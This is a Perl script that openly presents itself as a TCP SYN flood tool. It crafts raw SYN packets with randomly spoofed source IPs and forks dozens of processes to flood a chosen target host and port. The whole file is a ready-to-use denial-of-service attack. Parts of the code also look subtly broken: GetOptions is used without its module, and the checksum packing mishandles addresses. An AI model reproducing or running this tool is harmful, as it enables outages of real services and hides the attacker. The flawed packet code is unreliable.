#!/usr/bin/perl
#####################################################
# TCP SYN Flood - Pure Perl - No External Modules
# By Colin - Works on any Perl installation
######################################################

use Socket;
use strict;
use Time::HiRes qw(usleep);

our $port = 80;
our $time = 0;
our $threads = 50;
our $help = 0;

GetOptions(
    "port=i" => \$port,
    "time=i" => \$time,
    "threads=i" => \$threads,
    "help|?" => \$help);

my ($target) = @ARGV;

if ($help || !$target) {
    print "Uso: perl tcp_syn.pl <IP> [--port=80] [--time=60] [--threads=50]\n";
    exit(1);
}

print ">> TCP SYN Flood - No Modules Required\n";
print ">> Target: $target:$port\n";
print ">> Starting $threads threads...\n";

my $end_time = time() + ($time || 300);
my @pids;

$SIG{INT} = sub {
    kill 9, @pids if @pids;
    exit;
};

# TCP SYN packet crafting function
sub send_syn {
    my ($dst_ip, $dst_port) = @_;
    
    # Create raw socket
    socket(my $sock, PF_INET, SOCK_RAW, 6) or die "Raw socket failed: $!";
    
    # Set IP_HDRINCL option
    setsockopt($sock, 0, 1, 1) or die "Setsockopt failed: $!";
    
    while (time() < $end_time) {
        my $src_port = int(rand(63535)) + 2000;
        my $src_ip = join('.', int(rand(254))+1, int(rand(254))+1, 
                            int(rand(254))+1, int(rand(254))+1);
        
        # Build IP header
        my $ip_ver = 4;          # IPv4
        my $ip_ihl = 5;          # Internet Header Length (5 words = 20 bytes)
        my $ip_tos = 0;          # Type of Service
        my $ip_tot_len = 40;     # Total Length (IP + TCP = 20 + 20)
        my $ip_id = int(rand(65535));
        my $ip_frag = 0x4000;    # Don't fragment
        my $ip_ttl = 64;         # Time To Live
        my $ip_proto = 6;        # TCP protocol
        
        my $ip_checksum = 0;
        my $ip_src = inet_aton($src_ip);
        my $ip_dst = inet_aton($dst_ip);
        
        # Build TCP header
        my $tcp_seq = int(rand(4294967295));
        my $tcp_ack = 0;
        my $tcp_doff = 5;        # Data offset (5 words = 20 bytes)
        my $tcp_flags = 0x02;    # SYN flag
        my $tcp_window = 5840;
        my $tcp_checksum = 0;
        my $tcp_urg = 0;
        
        # TCP pseudo header for checksum
        my $pseudo_header = pack('NNnC4Nnnn', 
            $ip_src, $ip_dst, 0, 6, 0, 0, 0, 20,
            $src_port, $dst_port, $tcp_seq, $tcp_ack,
            ($tcp_doff << 12) | $tcp_flags, $tcp_window,
            $tcp_checksum, $tcp_urg);
        
        # Calculate TCP checksum
        $tcp_checksum = checksum($pseudo_header);
        
        # Rebuild TCP header with checksum
        my $tcp_header = pack('nnNNnnnn', 
            $src_port, $dst_port, $tcp_seq, $tcp_ack,
            ($tcp_doff << 12) | $tcp_flags, $tcp_window,
            $tcp_checksum, $tcp_urg);
        
        # Build IP header
        my $ip_header = pack('CCnnnCCna4a4',
            ($ip_ver << 4) | $ip_ihl, $ip_tos, $ip_tot_len,
            $ip_id, $ip_frag, $ip_ttl, $ip_proto, $ip_checksum,
            $ip_src, $ip_dst);
        
        # Send packet
        my $packet = $ip_header . $tcp_header;
        send($sock, $packet, 0, pack_sockaddr_in($dst_port, $ip_dst));
        
        usleep(100);  # Small delay between packets
    }
}

# Checksum function
sub checksum {
    my ($msg) = @_;
    my $len = length($msg);
    my $n = 0;
    my $sum = 0;
    
    for (my $i = 0; $i < $len; $i += 2) {
        $n = ($i + 1 < $len) ? unpack('C', substr($msg, $i+1, 1)) : 0;
        $sum += (unpack('C', substr($msg, $i, 1)) << 8) + $n;
    }
    
    $sum = ($sum >> 16) + ($sum & 0xffff);
    $sum += ($sum >> 16);
    return ~$sum & 0xffff;
}

# Fork multiple processes
for (my $i = 0; $i < $threads; $i++) {
    my $pid = fork();
    if ($pid == 0) {
        # Child process
        send_syn($target, $port);
        exit(0);
    } elsif ($pid) {
        push @pids, $pid;
    } else {
        die "Fork failed!\n";
    }
}

print ">> Attack running with $threads processes. Press Ctrl+C to stop.\n";

# Wait for child processes
if ($time) {
    sleep($time);
} else {
    while (1) {
        sleep(1);
        last if time() >= $end_time;
    }
}

# Kill all children
kill 9, @pids;
print ">> Attack finished.\n";